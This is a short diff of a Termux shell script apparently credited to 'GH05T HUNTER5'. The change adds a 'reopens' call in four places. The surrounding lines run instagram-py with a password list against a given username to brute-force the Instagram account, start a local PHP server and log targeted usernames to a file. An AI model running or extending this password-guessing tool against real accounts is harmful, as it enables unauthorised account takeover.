@@ -273,6 +273,7 @@ php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt 
 instagram-py --username $2 --password-list $value
 xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+reopens
 sleep 3
 echo -e " \033[1;37m +----------------------------------------------+"
 echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m   version\033[1;37m :\033[0;34m 3.01\033[1;37m|" 
@@ -337,6 +338,7 @@ php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
 instagram-py --username $2 --password-list $4
 xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+reopens
 sleep 3
 echo -e " \033[1;37m +----------------------------------------------+"
 echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m   version\033[1;37m :\033[0;34m 3.01\033[1;37m|" 
@@ -1072,6 +1074,7 @@ php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 echo "  User : $username " >> /data/data/com.termux/files/usr/cookies/cookie.txt 
 instagram-py --username $username --password-list $value
 xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+reopens
 sleep 3
 echo -e " \033[1;37m +----------------------------------------------+"
 echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m   version\033[1;37m :\033[0;34m 3.01\033[1;37m|" 
@@ -1135,6 +1138,7 @@ php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 echo "  User : $username " >> /data/data/com.termux/files/usr/cookies/cookie.txt 
 instagram-py --username $username --password-list $passnum
 xdg-open http://127.0.0.1:4444  > /dev/null 2>&1 &
+reopens
 sleep 3
 echo -e " \033[1;37m +----------------------------------------------+"
 echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m   version\033[1;37m :\033[0;34m 3.01\033[1;37m|" 
